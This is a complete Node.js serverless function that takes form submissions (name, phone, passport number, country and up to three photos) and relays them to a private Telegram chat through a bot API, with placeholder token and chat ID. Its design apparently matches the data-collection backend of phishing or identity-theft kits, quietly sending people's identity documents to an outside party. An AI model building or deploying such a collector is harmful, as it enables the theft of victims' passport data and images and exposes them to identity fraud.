const fetch = require("node-fetch");
const FormData = require("form-data");

exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);

    const BOT = "PUT_YOUR_BOT_TOKEN_HERE";
    const CHAT = "PUT_YOUR_CHAT_ID_HERE";

    const text = `
New User:
Name: ${data.name}
Phone: ${data.phone}
Passport: ${data.passport}
Country: ${data.country}
`;

    // 🧾 send text
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT,
        text: text
      })
    });

    // 📸 send photos using FormData (FIXED)
    const photos = [data.photo1, data.photo2, data.photo3];

    for (let p of photos) {
      if (p) {
        const form = new FormData();
        const buffer = Buffer.from(p, "base64");

        form.append("chat_id", CHAT);
        form.append("photo", buffer, {
          filename: "image.jpg",
          contentType: "image/jpeg"
        });

        await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }
    }

    return {
      statusCode: 200,
      body: "OK"
    };

  } catch (err) {
    console.log(err);
    return {
      statusCode: 500,
      body: "Error"
    };
  }
};
